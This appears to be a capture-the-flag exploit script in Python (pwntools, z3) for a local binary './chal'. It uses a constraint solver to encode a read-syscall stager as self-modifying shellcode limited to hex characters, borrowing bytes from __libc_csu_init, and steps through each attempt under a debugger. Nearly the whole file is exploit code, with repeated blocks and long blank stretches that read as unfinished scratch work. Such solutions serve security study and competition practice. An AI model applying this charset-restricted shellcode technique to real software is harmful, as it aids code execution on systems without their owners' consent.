from pinja import ninja_process, fake_debug
from pwn import *
import z3

context.arch = 'amd64'


opts= b"0123456789ABCDEF"
def lo():
    print(p.dump_regs(['rax','rsi','rcx', 'rdx', 'rbx', 'rdi'], hexxed= True, hint=True))
    print(p.execute_backend_command("x/5i $rip"))

p = ninja_process("./chal")
p.add_breakpoint_sym("main+148")
p.go()

p.recvuntil(b"Data:")


shellcode = """
xor al, 0x41
"""

# Padding
shellcode = asm(shellcode)
if len(shellcode) % 2 != 0:
    shellcode += b"0"

print(shellcode)
shellcode = bytes.fromhex(shellcode.decode('latin'))
p.send(shellcode)

# Hit breakpoint first
sleep(.3)

p.set_reg_value("rbx", p.bv.symbols['__libc_csu_init'][0].address)
p.step_into()
sleep(.3)

















"""
rax/rsi->Shellcode
rbx->csu
rcx->BSS string
rdx->End

"""


print(p.execute_backend_command("x/10i $rbx"))
print(p.execute_backend_command("x/20bx $rbx+0x30"))

def find_csu():
    csu = []
    for i in range(0x30, 0x50 ):
        if i in opts:
            csu.append((u8(p.bv.read( p.bv.symbols['__libc_csu_init'][0].address + i, 1))))
        else:
            csu.append(0)
    return csu

csu = find_csu()
print(csu)


























# rsi rdx already setup
stager = asm("""
xor eax, eax
xor edi,edi 
syscall
""")






































def find_valid(target : int):
    s = z3.Solver()
    x = z3.BitVec('x', 32)
    y = z3.BitVec('y', 32)

    s.add( z3.Or([ x ==i for i in csu + [ a for a in opts] ]))

    s.add( z3.Or([ y ==i for i in csu + [ a for a in opts] ]))

    s.add(x ^ y== target)
    print(s.check())
    print(s.model())
    return (s.model()[x].as_long(), s.model()[y].as_long())









































shellcode = ""
for bitty in range(len(stager)):
    a = find_valid(stager[bitty])

    if a[0] in opts:
        shellcode += f"xor al, {a[0]}\n"
    else:
        # Index of 0 wrong as its padding, 55th byte is a legit null
        if a[0] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[0]) } ] \n"


    if a[1] in opts:
        shellcode += f"xor al, {a[1]}\nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"
    else:
        if a[1] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[1]) } ] \nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"

p.close()

p = ninja_process("./chal")
p.add_breakpoint_sym("main+148")
p.go()

p.recvuntil(b"Data:")



print(shellcode)
# Padding
shellcode = asm(shellcode)
if len(shellcode) % 2 != 0:
    shellcode += b"0"

print(shellcode)
shellcode = bytes.fromhex(shellcode.decode('latin'))
p.send(shellcode)

# Hit breakpoint first
sleep(.3)

p.set_reg_value("rbx", p.bv.symbols['__libc_csu_init'][0].address)
p.step_into()
sleep(.3)














































shellcode = ""

for bitty in range(len(stager)):
    a = find_valid(stager[bitty])

    if a[0] in opts:
        shellcode += f"xor al, {a[0]}\n"
    else:
        # Index of 0 wrong as its padding, 55th byte is a legit null
        if a[0] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[0]) } ] \n"


    if a[1] in opts:
        shellcode += f"xor al, {a[1]}\nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"
    else:
        if a[1] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[1]) } ] \nxor BYTE PTR [rdx+ { 0x30 + bitty } ], al\n"

    # CLEAN OUT REG OR add prev byte to solver ( latter)
    if a[0] in opts:
        # stupid me
        shellcode += f"xor al, {a[0]}\n"
    else:
        if a[0] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[0]) } ] \n"

    if a[1] in opts:
        shellcode += f"xor al, {a[1]}\n"
    else:
        if a[1] == 0:
            shellcode += f"xor al, BYTE PTR [rbx+{ 55 } ] \n"
        else:
            shellcode += f"xor al, BYTE PTR [rbx+{ 0x30 + csu.index(a[1]) } ] \n"

p.close()

p = ninja_process("./chal")
p.add_breakpoint_sym("main+148")
p.go()

p.recvuntil(b"Data:")



print(shellcode)
# Padding
shellcode = asm(shellcode)
if len(shellcode) % 2 != 0:
    shellcode += b"0"

print(shellcode)
shellcode = bytes.fromhex(shellcode.decode('latin'))
p.send(shellcode)

# Hit breakpoint first
sleep(.3)

p.set_reg_value("rbx", p.bv.symbols['__libc_csu_init'][0].address)
p.step_into()
sleep(.3)
